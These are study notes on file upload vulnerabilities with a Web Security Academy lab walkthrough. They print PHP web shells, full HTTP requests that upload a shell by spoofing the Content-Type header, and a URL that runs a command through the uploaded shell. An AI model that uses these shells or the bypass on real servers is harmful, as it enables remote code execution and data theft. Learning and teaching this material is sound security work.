# File Upload Vulnerability

* File upload vulnerability when web-server allows users to upload files to it's filesystem without sufficiently validating things like their `name`, `type`, `content`. `size` , `extension` and `metadata` etc.

## Impact : 

* In worst case scenario's if system allows the attacker to upload file without validating the the content-type, extension then the attacker can upload the file with (.php and .jsp) and execute the `command injection`.  
* A successful file upload vulnerability can cause the `Remote Code Execution` by uploading the web-shell into the server and getting the connection back.
* If server is also vulnerable to the `directory traversal`, this could mean attacker are even able to upload file in unanticipated location.
* This vulnerability can cause the system takeover if internal system architecture is week.


## How do file upload vulnerability arise?

* It's rare for website in the wild to have no restriction whatsoever on which files users are allowed to upload. More commonly, developers implemented what they believe to be robust validation that is either inherently flawed or can be bypassed.
* Example : there may have attempt to check the file-type by verifying properties that they can be easily bypassed manipulated by attacker using tools like burp proxy or repeater.
* Ultimately, even robust validation measures may be applied inconsistently across the network of hosts and directory that the website, resulting in discrepancies that can be exploited.

## How do web servers handel request for static files?

* Before we look at how to exploit the upload vulnerability, it's important that you have a basic understanding of how servers handel request for static files.

* Historically, website consisted almost entirely of static files that would be served to users when requested. As a result, the path of each request could be mapped `1:1` with the hierarchy of directories and files on the server's filesystem. Nowadays, Website are increasingly dynamic and the path of a request often has no direct relationship to the filesystem at all. Nevertheless, web servers still deal with request for some static files, including stylesheets, images, and so on.

* The process for handling these static files is still largely the same. At some point, the server parses the path in the request to identify the file extension. it then users this to determine the type of the being requested, typically by comparing it to a list of preconfigured mapping between extensions and `MIME`(multipurpose internet mail extensions) types. What happens next depends on the file type and the server's configuration.
  * If the file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.
  * If the file is executable, such as PHP file, and the server is configured to execute file of this type, it will assign variable based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.
  * If the file is executable, but server is not configured to execute this file type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfiguration can occasionally be exploit to leak source code and other sensitive information.

## Exploiting unrestricted file upload to deploy a web shell.

* From a security perspective, the worst possible scenario is when a website allows you to upload server-side script, such as PHP, Java or Python Files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.

* If you are able to successfully upload a web-shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attack against both internal infrastructure and other server outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the servers filesystem:

> Simple web-shell to read the file system. 
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
> More versatile web-shell may look something like this.
```php
<?php echo system($_GET['command']); ?>
```
> This script enable you to pass an arbitrary command via a query parameter as follows:
```html
GET /example/exploit.php?command=id HTTP/1.1
```

## Exploiting flawed validation of file upload

* In the wild, it's unlikely that you'll find a website that has no protection whatsoever against file upload attacks. But just because defense are in place, that doesn't mean that they're robust.
* In this section, we'll look at some ways that web servers attempt to validate and sanitize file upload, as well as how we can exploit flaws in these mechanisms to obtain a web shell for remote code execution.

### Flawed file type validation

* When submitting HTML forms, the browser typically send the provided data in a `POST` request with content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name, address, and so on, but it is not suitable for sending large amount of binary data, such as an entire image file or a PDF documents. In this case,the content type `multipart/form-data` is the preferred approach.

* Consider a from containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:

```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```
* As we can see, the message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provide some basic information about the input field it relates to. These individuals part may also contains their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using the input.

* One way that website may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. if the server is only expecting image files. for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME Type, this defense can be easily bypassed using tools like burp repeater.

#### Lab : Web shell upload via Content-Type restriction bypass
---
* In this lab we can upload the `php` web shell file by simply changing the content type.

* Intercepting in burp.


> Request 
```http
POST /my-account/avatar HTTP/2
Host: 0aee008d03ba60d9806fad42006500a7.web-security-academy.net
Cookie: session=qeAqXHilspJu6Fn6FBJPaRnAKTpNW8T8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------27479249093562940139707925911
Content-Length: 523
Origin: https://0aee008d03ba60d9806fad42006500a7.web-security-academy.net
Referer: https://0aee008d03ba60d9806fad42006500a7.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------27479249093562940139707925911
Content-Disposition: form-data; name="avatar"; filename="file.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>

-----------------------------27479249093562940139707925911
Content-Disposition: form-data; name="user"

wiener
-----------------------------27479249093562940139707925911
Content-Disposition: form-data; name="csrf"

xH1zy54kJaGE646z5fscHqaDIS8aI5Po
-----------------------------27479249093562940139707925911--
```
> Response
```html
HTTP/2 403 Forbidden
Date: Fri, 31 Mar 2023 11:43:10 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 231

Sorry, file type application/x-php is not allowed
        Only image/jpeg and image/png are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
* Now we change the content type from `application/x-php` to `image/jpeg`.

> Request
```http
POST /my-account/avatar HTTP/2
Host: 0aee008d03ba60d9806fad42006500a7.web-security-academy.net
Cookie: session=qeAqXHilspJu6Fn6FBJPaRnAKTpNW8T8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------27479249093562940139707925911
Content-Length: 516
Origin: https://0aee008d03ba60d9806fad42006500a7.web-security-academy.net
Referer: https://0aee008d03ba60d9806fad42006500a7.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------27479249093562940139707925911
Content-Disposition: form-data; name="avatar"; filename="file.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>

-----------------------------27479249093562940139707925911
Content-Disposition: form-data; name="user"

wiener
-----------------------------27479249093562940139707925911
Content-Disposition: form-data; name="csrf"

xH1zy54kJaGE646z5fscHqaDIS8aI5Po
-----------------------------27479249093562940139707925911--

```
> Response
```http
HTTP/2 200 OK
Date: Fri, 31 Mar 2023 11:45:38 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 129

The file avatars/file.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
* Web shell is successfully uploaded, we can go the path of that file which we get in response, and use the parameter `?command=` and execute the commands.

```http
https://0aee008d03ba60d9806fad42006500a7.web-security-academy.net/files/avatars/file.php?command=cat+/home/carlos/secret
```

---

### Preventing file execution in user-accessible directories.
  
* While it's clearly better to prevent dangerous file type being uploaded in the first place, the second line of defense is to stop the server from executing any script that do slip through the net.
* As a precaution, server generally only run script whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:

```http
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com


HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```
